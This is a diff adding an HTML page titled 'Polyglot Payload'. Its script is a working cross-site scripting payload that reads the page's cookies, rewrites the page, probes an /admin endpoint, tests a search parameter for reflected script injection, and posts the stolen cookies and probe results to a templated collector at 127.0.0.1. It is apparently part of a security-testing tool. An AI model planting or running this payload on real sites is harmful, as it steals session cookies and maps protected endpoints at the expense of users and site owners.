@@ -1,0 +1,68 @@
+<html>
+<head>
+<title>Polyglot Payload</title>
+</head>
+
+<body>
+<h2>Polyglot Executed</h2>
+
+<script>
+(function() {
+
+    let results = [];
+
+    // 1. XSS Proof
+    alert("XSS via Polyglot");
+
+    // 2. Cookie Access
+    let cookies = document.cookie || "No cookies available";
+
+    document.body.innerHTML += "<h3>Cookies:</h3><pre>" + cookies + "</pre>";
+    results.push("Cookies: " + cookies);
+
+    // 3. DOM Manipulation
+    document.body.style.background = "black";
+    document.body.style.color = "lime";
+    document.body.innerHTML += "<p>DOM Modified Successfully</p>";
+
+    // 4. Endpoint probing
+    fetch('/admin')
+        .then(res => {
+            if (res.status === 200) {
+                document.body.innerHTML += "<p>/admin accessible</p>";
+                results.push("Admin Accessible");
+            } else {
+                results.push("Admin Protected");
+            }
+        })
+        .catch(() => {
+            results.push("Admin Check Failed");
+        });
+
+    // 5. Reflection test
+    fetch('/search?q=<script>alert(1)</script>')
+        .then(res => res.text())
+        .then(data => {
+            if (data.includes("<script>alert(1)</script>")) {
+                document.body.innerHTML += "<p>Reflected XSS possible</p>";
+                results.push("Reflected XSS Possible");
+            }
+        });
+
+    // 6. Send data to local server
+    fetch("http://127.0.0.1:{{PORT}}/log", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            cookies: cookies,
+            results: results
+        })
+    });
+
+})();
+</script>
+
+</body>
+</html>
